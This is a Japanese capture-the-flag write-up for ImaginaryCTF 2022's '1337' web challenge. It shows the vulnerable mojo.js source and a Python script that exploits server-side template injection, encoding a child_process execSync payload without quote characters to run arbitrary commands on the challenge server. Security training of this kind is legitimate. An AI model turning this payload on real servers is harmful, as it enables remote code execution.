---
layout: chall
ctf_name: imaginaryctf_2022
problem_name: 1337
genre: web
solved_date: 2022-07-18
during_ctf: true
tag: [ssti,mojo]
fav: false
difficulty: easy
---

### 概要

<details><summary>コード</summary>

```js
import mojo from "@mojojs/core";
import Path from "@mojojs/path";

const toLeet = {
  A: 4,
  E: 3,
  G: 6,
  I: 1,
  S: 5,
  T: 7,
  O: 0,
};

const fromLeet = Object.fromEntries(
  Object.entries(toLeet).map(([k, v]) => [v, k])
);

const layout = `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>1337</title>
    <link rel="stylesheet" href="static/style.css">
</head>
<body>
    <main>
        <%== ctx.content.main %>
    </main>
    <canvas width="500" height="200" id="canv" />
    <script src="static/matrix.js"></script>
</body>
</html>`;

const indexTemplate = `
<h1>C0NV3R7 70/FR0M L337</h1>
<form id="leetform" action="/">
    <input type="text" id="text" name="text" placeholder="Your text here">
    <div class="switch-field">
        <input type="radio" id="dir-to" name="dir" value="to" checked="checked">
        <label for="dir-to">TO</label>
        <input type="radio" id="dir-from" name="dir" value="from">
        <label for="dir-from">FROM</label>
    </div>
    <input type="submit" value="SUBMIT">
</form>
<div id="links">
  <a href="/source">/source</a>
  <a href="/docker">/docker</a>
</div>
`;

const app = mojo();

const leetify = (text, dir) => {
  const charBlocked = ["'", "`", '"'];
  const charMap = dir === "from" ? fromLeet : toLeet;

  const processed = Array.from(text)
    .map((c) => {
      if (c.toUpperCase() in charMap) {
        return charMap[c.toUpperCase()];
      }

      if (charBlocked.includes(c)) {
        // return "";
      }

      return c;
    })
    .join("");

  return `<h1>${processed}</h1><a href="/">←BACK</a>`;
};

app.get("/", async (ctx) => {
  const params = await ctx.params();
  if (params.has("text")) {
    return ctx.render({
      inline: leetify(params.get("text"), params.get("dir")),
      inlineLayout: layout,
    });
  }
  ctx.render({ inline: indexTemplate, inlineLayout: layout });
});

app.get("/source", async (ctx) => {
  const readable = new Path("index.js").createReadStream();
  ctx.res.set("Content-Type", "text/plain");
  await ctx.res.send(readable);
});

app.get("/docker", async (ctx) => {
  const readable = new Path("Dockerfile").createReadStream();
  ctx.res.set("Content-Type", "text/plain");
  await ctx.res.send(readable);
});

console.log("start");
app.start();
```

</details>


### 解法

SSTI が作り込まれているので、`<%= (await import("child_process")).execSync("ls").toString() %>` のようなペイロードで発火させることができる。しかし、文字列リテラルを含めることはできないので、文字列を `Number.toString(base)` と `String.charCodeAt` で構成した。後から気がついたことだが、正規表現リテラルを用いればもう少々簡略化できたかもしれない。

<details><summary>スクリプト</summary>

```py
import string

import requests

def create_num(n: int):
  orign = n
  odd = n % 2 == 1
  if odd:
    n += 9
  res = ""
  for c in bin(n)[2:-1]:
    if res != "":
      res = f"({res})*2"
    if c == "1":
      res = f"{res}+2" if res != "" else "2"
  if odd:
    res = f"{res}-9"
  assert eval(res) == orign, eval(res)
  return res
  
b36_chr = string.digits + string.ascii_lowercase

def b36encode(s: str):
  res = 0
  for c in s:
    res *= 36
    res += b36_chr.index(c)
  return res


def escape(s: str):
  res = []
  buf = ""
  def process_buf():
    nonlocal buf
    if buf == "": return
    encoded = b36encode(buf)
    res.append(f'({create_num(encoded)}).toString(8*9/2)')
    buf = ""
  for c in s:
    if c in b36_chr:
      buf += c
      continue
    process_buf()
    res.append(f'String.fromCharCode({create_num(ord(c))})')
  process_buf()
  return '+'.join(res)


while True:
  cmd = input("$ ")
  prog = '(await import(' + escape('child_process') + ')).execSync(' + escape(cmd) + ').toString()'
  res = requests.get(
    f'http://1337.chal.imaginaryctf.org',
    { 'text': f'<%= {prog} %>', "dir": "from" }
  )
  print(res.text.split("<h1>")[1].split("</h1>")[0])
```

</details>

